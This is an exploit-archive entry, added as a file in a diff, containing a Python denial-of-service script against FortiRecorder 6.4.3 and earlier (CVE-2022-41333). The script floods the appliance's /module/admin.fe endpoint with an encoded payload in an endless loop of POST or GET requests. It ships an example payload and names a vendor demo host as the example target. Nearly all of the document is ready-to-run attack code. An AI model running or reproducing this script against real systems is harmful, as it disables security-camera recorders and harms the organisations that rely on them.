@@ -1,0 +1,73 @@
+id: 38549
+date: 04/08/2023
+title: FortiRecorder 6.4.3 - Denial of Service Exploit
+author: Mohammed Adel
+cves: CVE-2022-41333
+
+# Exploit Title: FortiRecorder 6.4.3 - Denial of Service
+# Exploit Author: Mohammed Adel
+# Vendor Homepage: https://www.fortinet.com/
+# Software Link: https://www.fortinet.com/products/network-based-video-security/forticam-fortirecorder
+# Version: 6.4.3 and below && 6.0.11 to 6.0.0
+# Tested on: Kali Linux
+# CVE : CVE-2022-41333
+# Security Advisory: https://www.fortiguard.com/psirt/FG-IR-22-388
+# Technical Analysis: https://medium.com/@0xpolar/cve-2022-41333-71eb289d60b5
+
+import requests
+import warnings
+import sys
+from urllib.parse import unquote
+warnings.filterwarnings('ignore', message='Unverified HTTPS request')
+
+def POST(target, req_type, payload):
+    print("[+] Target      : "+target)
+    print("[+] Request Type: POST")
+    print("[+] Payload     : " +payload)
+    post_url = target+"/module/admin.fe"
+    post_headers = {"User-Agent": "CVE-2022-41333", "Content-Type": "application/x-www-form-urlencoded"}
+    url_decoder = unquote(payload)
+    full_payload = "fewReq="+url_decoder
+    while True:
+        r = requests.post(post_url, headers=post_headers, data=full_payload, verify=False)
+        if "Failed: Access denied" in r.text:
+            print("[+] Payload Sent.")
+        else:
+            print("[!] Something went wrong!")
+            print(r.text)
+
+def GET(target, req_type, payload):
+    print("[+] Target      : "+target)
+    print("[+] Request Type: GET")
+    print("[+] Payload     : " +payload)
+    while True:
+      url = target+"/module/admin.fe?fewReq="+payload
+      headers = {"User-Agent": "CVE-2022-41333", "Connection": "close"}
+      r = requests.get(url, headers=headers, verify=False)
+      if "Failed: Access denied" in r.text:
+          print("[+] Payload Sent.")
+      else:
+          print("[!] Something went wrong!")
+          print(r.text)
+
+
+print("[+] Starting ..")
+target = str((sys.argv[1])) # https://fortirecorder.fortidemo.com
+req_type = str((sys.argv[2])) # POST or GET
+payload = str((sys.argv[3])) # :B:JSsrJW16blB9dXp8ayJMZmxcfnJee3J2cTltem5efGt2cHEiLio5amx6bXF+cnoi
+
+
+if "post" in req_type.lower():
+    if "https" in target.lower() or "http" in target.lower():
+        POST(target, req_type, payload)
+    else:
+        print("[!] Invalid Target. [Ex: https://fortirecorder.fortidemo.com]")
+elif "get" in req_type.lower():
+    if "https" in target.lower() or "http" in target.lower():
+        GET(target, req_type, payload)
+    else:
+        print("[!] Invalid Target. [Ex: https://fortirecorder.fortidemo.com]")
+else:
+    print("[!] Invalid Request Type.")
+
+#  0day.today [2023-04-19]  #
